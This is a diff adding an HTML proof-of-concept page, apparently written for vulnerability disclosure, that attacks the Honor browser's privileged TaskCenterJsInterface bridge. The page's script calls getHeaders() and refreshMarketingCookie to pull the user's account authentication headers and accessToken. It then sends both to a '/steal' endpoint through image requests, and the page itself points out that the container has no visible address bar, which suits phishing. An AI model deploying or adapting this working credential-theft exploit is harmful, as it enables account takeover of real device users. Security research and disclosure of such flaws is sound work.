@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC Payload</title>
+<style>
+  body { font-family: monospace; background:#1a1a1a; color:#eee; padding:20px; word-break:break-all; }
+  h2 { color:#ff5555; }
+  .box { background:#000; border:1px solid #ff5555; border-radius:6px; padding:12px; margin:12px 0; }
+  .label { color:#888; font-size:13px; }
+  .ok { color:#44ff44; } .bad { color:#ff5555; }
+  #token { color:#ffff66; font-size:15px; }
+</style>
+</head>
+<body>
+<h2>⚠ 本页面正运行在荣耀浏览器内部特权容器 OperationActivity 中</h2>
+<p>注意：此页面<b>无地址栏、无标题栏</b>——用户无法分辨当前不是正常网页（钓鱼容器证据）。</p>
+<div id="steps"></div>
+
+<div class="box">
+  <div class="label">荣耀账号 accessToken（TaskCenterJsInterface.refreshMarketingCookie 回注）：</div>
+  <div id="token">获取中…</div>
+</div>
+<div class="box">
+  <div class="label">云端认证请求头（TaskCenterJsInterface.getHeaders，含 x-userid / x-udid）：</div>
+  <div id="headers">获取中…</div>
+</div>
+
+<script>
+var steps = document.getElementById('steps');
+function step(msg, ok) {
+  steps.innerHTML += '<div class="' + (ok === false ? 'bad' : 'ok') + '">[' +
+    new Date().toLocaleTimeString() + '] ' + msg + '</div>';
+}
+// 结果外带：同源 /steal，任意静态服务器的 access log 即可收到完整值
+function exfil(k, v) {
+  try { new Image().src = '/steal?' + k + '=' + encodeURIComponent(v); } catch (e) {}
+}
+
+// JD4 的回调约定：evaluateJavascript 执行 cb("callbackId", "token", "success")
+window.__tokenCb = function (id, token, status) {
+  if (token && token.length > 0) {
+    document.getElementById('token').textContent = token;
+    step('accessToken 已进入本页面 JS 上下文并显示（status=' + status + ', len=' + token.length + '）');
+    exfil('token', token);
+  } else {
+    document.getElementById('token').textContent = '(空 — 设备未登录荣耀账号?)';
+    step('回调触发但 token 为空', false);
+  }
+};
+
+window.addEventListener('load', function () {
+  setTimeout(function () {
+    if (typeof TaskCenterJsInterface === 'undefined') {
+      step('TaskCenterJsInterface 不存在：不在特权容器内 / 版本已修复', false);
+      return;
+    }
+    step('特权桥 TaskCenterJsInterface 存在');
+    try {
+      var h = TaskCenterJsInterface.getHeaders();
+      document.getElementById('headers').textContent = h;
+      step('getHeaders() 返回 ' + (h ? h.length : 0) + ' 字节认证头');
+      exfil('headers', h);
+    } catch (e) { step('getHeaders 异常: ' + e, false); }
+    try {
+      TaskCenterJsInterface.refreshMarketingCookie('__tokenCb', 'demo');
+      step('已调用 refreshMarketingCookie，等待 token 回注…');
+    } catch (e) { step('refreshMarketingCookie 异常: ' + e, false); }
+  }, 600);
+});
+</script>
+</body>
+</html>
